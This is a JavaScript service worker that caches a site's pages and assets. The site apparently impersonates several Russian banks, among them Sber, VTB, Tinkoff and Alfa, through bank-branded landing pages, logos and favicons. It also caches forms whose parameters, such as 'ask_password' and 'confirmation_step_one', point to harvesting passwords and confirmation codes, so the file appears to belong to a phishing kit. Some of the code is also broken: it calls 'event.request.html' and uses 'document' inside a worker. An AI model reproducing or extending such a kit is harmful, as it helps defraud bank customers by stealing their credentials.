var urlsToCache = [
    '/',
    'favicon.ico',
    'css/v2/main.css',
    'css/v2/style.css',
    'css/v2/land.css',
    'css/style.css',
    'css/fonts.css',
    'index_otkritie.html',
    'index_sber.html',
    'index_pochta.html',
    'index_vtb.html',
    'index_tinkoff.html',
    'index_alfa.html',
    'index_banks.html',
    'index_welcome.html',
    'index_gaz.html',
    'index_rnkb.html',
    '/fonts/Gilroy-Regular.woff',
    '/fonts/Gilroy-SemiBold.woff',
    '/fonts/free-fa-brands-400.ttf',
    '/fonts/free-fa-brands-400.woff2',
    '/fonts/free-fa-regular-400.ttf',
    '/fonts/free-fa-regular-400.woff2',
    '/fonts/free-fa-solid-900.ttf',
    '/fonts/free-fa-solid-900.woff2',
    '/fonts/free-fa-v4compatibility.ttf',
    '/fonts/free-fa-v4compatibility.woff2',
    '/fonts/Gilroy-Regular.woff',
    '/fonts/Gilroy-SemiBold.woff',
    'js/base.js',
    'js/base_v2.js',
    'js/base_v3.js',
    'js/core.min.js',
    'form6943.html?init=1',
    'form85c5.html?flow_start=rnkb',
    'form203e.html?flow_start=gaz',
    'form7acd.html?flow_start=otkritie',
    'form7fa2.html?flow_start=vtb',
    'formc457.html?flow_start=pochta',
    'formca93.html?flow_start=tinkoff',
    'forme9b9.html?flow_start=sber',
    'form040f.html?flow_start=alfa',
    'formd99b.html?flow_additional=1&amp;template_code=confirmation_step_one',
    'form50a8.html?flow_additional=1&amp;template_code=confirmation_step_two',
    'form3d87.html?ask_password=1',
    'forme1d1.html?ask_password=1&amp;iteration=1',
    'form0044.html?ask_password_vtb=1',
    'formd829.html?ask_password_vtb=1&amp;iteration=1',
    'form8a06.html?ask_question=1',
'form342e.html?ask_password_general=1',
    'images/100000.png',
    '/images/bakson.mp4',
    'images/card.svg',
    'images/checkmark.svg',
    'images/consultant.png',
    'images/sber_auth_bg.png',
    'images/euro.svg',
    'images/fb.png',
    'images/geolocation_marker.png',
    'images/girl_1.png',
    'images/girl_2.png',
    'images/girl_3.png',
    'images/Instagram.png',
    'images/logo.png',
    'images/mini-arrow.png',
    'images/mini-cart.png',
    'images/mobile.png',
    'images/mobile-app-logo.png',
    'images/services.png',
    'images/Twitter.png',
    'images/usluga_1.jpg',
    'images/usluga_2.jpg',
    'images/usluga_3.jpg',
    'images/video_help_code.jpg',
    '/images/video_help_code.mp4',
    'images/Vk.png',
    'images/woman.png',
    'images/YouTube.png',
    'images/sberbank-logo.befb25b6.svg',
    'images/sberbank-logo.big.svg',
    'images/merchant-default-logo.5097d6a7.svg',
    'images/cards.png',
    'images/pays/apple-pay-short-black.95ff5f36.svg',
    'images/pays/apple-pay-short-white.3ff93243.svg',
    'images/pays/google-pay-short-color.488dfacd.svg',
    'images/pays/google-pay-short-white.1b2f9bd7.svg',
    'images/pays/samsung-pay-short-black.659dacd3.svg',
    'images/pays/samsung-pay-short-white.c8a78e02.svg',
    'images/land/otkritie.svg',
    'images/land/pochta.svg',
    'images/land/gaz.svg',
    'images/land/rnkb.svg',
    'images/land/vtb.svg',
    'images/land/sber.svg',
    'images/land/tinkoff.svg',
    'images/land/alfa.html',
    'images/land/ps-card.svg',
    'favicons/favicon_otkritie.svg',
    'favicons/favicon_pochta.ico',
    'favicons/favicon_sber.ico',
    'favicons/favicon_vtb.ico',
    'favicons/favicon_tinkoff.png',
    'favicons/favicon_alfa.html',
];
var CACHE_PREFIX = 'my-cache-';

self.addEventListener('install', function (event) {
    var now = Date.now();

    event.waitUntil(
        caches.open(CACHE_PREFIX + now)
            .then(function (cache) {
                console.log('Opened cache');
                // Добавьте файлы в кэш
                return cache.addAll(urlsToCache);
            })
    );
});

self.addEventListener('fetch', function (event) {
    event.respondWith(
        caches.match(event.request)
            .then(function (response) {
                if (response) {
                    return response;
                } else {
                    let url = new URL(event.request.html);
                    url.searchParams.set('originalReferer', document.referrer);
                    return fetch(url, {mode: 'cors', cache: 'default'});
                }
            })
    );
});

self.addEventListener('activate', function (event) {
    var maxAge = Date.now() - (4 * 24 * 60 * 60 * 1000); // 4 days

    event.waitUntil(
        caches.keys().then(function (cacheNames) {
            return Promise.all(
                cacheNames.map(function (cacheName) {
                    var match = cacheName.match(/^my-cache-(\d+)$/);
                    var cacheTime = match ? Number(match[1]) : 0;
                    if (cacheTime < maxAge) {
                        return caches.delete(cacheName);
                    }
                })
            );
        })
    );
});